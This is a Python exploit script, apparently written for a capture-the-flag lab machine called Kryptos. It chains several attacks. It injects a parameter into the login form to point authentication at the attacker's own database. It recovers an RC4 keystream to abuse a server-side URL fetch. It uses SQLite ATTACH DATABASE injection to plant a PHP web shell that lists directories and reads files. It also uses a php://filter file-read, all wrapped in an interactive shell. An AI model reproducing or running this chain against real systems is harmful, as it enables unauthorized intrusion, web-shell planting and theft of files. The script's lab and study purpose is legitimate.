#!/usr/bin/env python3

import base64
import fcntl
import logging
import random
import re
import requests
import socket
import string
import struct
import sys
import threading
import urllib.parse
from cmd import Cmd


burp = {"http":"http://127.0.0.1:8080"}
http_resp = """\
HTTP/1.1 200 OK

{output}
"""

# get local ip
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ip = socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', b'tun0'))[20:24])
print(f"[*] Local IP: {ip}")

class KryptosWeb(object):

    def __init__(self):
        self.login()
        self.get_keystream()
        self.enable_fs_walk()

    def login(self):
        self.s = requests.session()
        print('[*] Getting token from root page')
        try:
            resp = self.s.get('http://10.10.10.129/', proxies=burp)
            token = re.search(r'value="([a-f0-9]{64})"', resp.text)[1]
        except TypeError:
            print('[-] Unable to get token from page')
            sys.exit(1)

        print('[+] Got token\n[*] Submitting Login')
        data = f"username=admin&password=admin&db=cryptor;host={ip};post=3306&token={token}&login="
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        resp = self.s.post(f'http://10.10.10.129/index.php', data=data, headers=headers, proxies=burp)
        if not resp.history:
            print('[-] Login to kryptos failed. Is mysql running with the correct data?')
            sys.exit(1)
        print('[+] Logged in to page')

    def get_keystream(self, length=1000, port=7001):
        print(f'[*] Starting webserver on {port} to serve content of length {length}')
        thread1 = threading.Thread(target = self.serve_static, args = [length, port])
        thread1.start()

        print('[*] Requesting known page')
        resp = self.s.get(f'http://10.10.10.129/encrypt.php?cipher=RC4&url=http://{ip}:7001')
        enc = base64.b64decode(re.search(r'<textarea .*id="output.*>([A-Za-z0-9+/]+={0,2})</textarea>', resp.text)[1])
        self.keystream = [x ^ ord(y) for x,y in zip(enc, self.plain)]
        print('[+] Derived RC4 keystream')

    def get_page(self, url):
        resp = self.s.get(f'http://10.10.10.129/encrypt.php?cipher=RC4&url={url}', proxies=burp)
        try:
            enc = base64.b64decode(re.search(r'<textarea .*id="output.*>([A-Za-z0-9+/]+={0,2})</textarea>', resp.text)[1])
        except TypeError:
            print(f'[-] No data returned from {url}')
            return

        if len(enc) > len(self.keystream):
            self.get_keystream(len(enc) + 1000)
        plain = ''.join([chr(x^y) for x,y in zip(enc, self.keystream)])
        return plain


    def serve_static(self, length, port):
        self.plain = "A"*length
        listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listen_socket.bind(('', port))
        listen_socket.listen(1)
        client_connection, client_address = listen_socket.accept()
        request = client_connection.recv(1024) 
        output = "A"*length
        client_connection.sendall(http_resp.format(output=output).encode())
        client_connection.close()
        listen_socket.close()


    def enable_fs_walk(self):
        print("[*] Injecting php file for dir walks and file gets")
        self.phpname = ''.join(random.choices(string.ascii_uppercase + string.digits, k=15)) + ".php"
        phpcode = """\n\n\n\n0xdfSTART0xdf<?php print_r(scandir($_GET["dir"])); echo base64_encode(file_get_contents($_GET["file"])); ?>0xdfEND0xdf"""
        inject = f"""1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/{self.phpname}' AS df;CREATE TABLE df.pwn (pwn_stuff text);INSERT INTO df.pwn (pwn_stuff) VALUES ('{phpcode}');--""" 
        url = f'http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid={urllib.parse.quote(inject, safe="")}'
        resp = self.get_page(urllib.parse.quote(url, safe=""))
        if 'Query : SELECT * FROM books WHERE id=1;ATTACH' in resp:
            print(f"[+] Injected php page as {self.phpname}")
        else:
            print("[-] Failed to inject php page")


    def file_or_dir_walk(self, action, path):
        return self.get_page(f"http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/{self.phpname}?{action}={path}")



class Terminal(Cmd):
    prompt = "page> "

    def __init__(self):
        super().__init__()
        self.kryptos = KryptosWeb()

    def default(self, args):
        print(self.kryptos.get_page(args))


    def do_devb64(self, args):
        resp = self.kryptos.get_page(f'http://127.0.0.1/dev/index.php?view=php://filter/convert.base64-encode/resource={args}', proxies=burp)
        try:
            print(base64.b64decode(re.search(r'\n([A-Za-z0-9+/]+={0,2})</body>', resp)[1]).decode())
        except TypeError:
            print(f'[-] No data returned from {args}') 


    def do_refresh(self, args):
        self.kryptos.login()
        self.kryptos.enable_fs_walk()


    def do_ls(self, args):
        resp = self.kryptos.file_or_dir_walk("dir", args)
        try:
            result = re.search(r'0xdfSTART0xdfArray\n\(\n(.*)\n\)\n0xdfEND0xdf', resp, re.DOTALL)[1]
        except TypeError:
            print("error")
            return
        for line in result.split("\n"):
            print('  ' + ' '.join(line.split(' ')[6:]))

    def do_cat(self, args):
        outfile = None
        args_array = args.split(' ')
        if args_array[0] == "-f":
            outfile = args_array[1]
            args_array = args_array[2:]
        args = ' '.join(args_array)

        resp = self.kryptos.file_or_dir_walk("file", args)
        try:
            result = re.search(r'0xdfSTART0xdf(.*)0xdfEND0xdf', resp)[1]
        except TypeError:
            print('[-] Unable to get result from page')
            return
        if outfile:
            with open(outfile, 'wb') as f:
                f.write(base64.b64decode(result))
        else:
            print(base64.b64decode(result).decode('ascii', 'backslashreplace')) 


term = Terminal()
try:
    term.cmdloop()
except KeyboardInterrupt:
    print("\n[*] Exiting...")
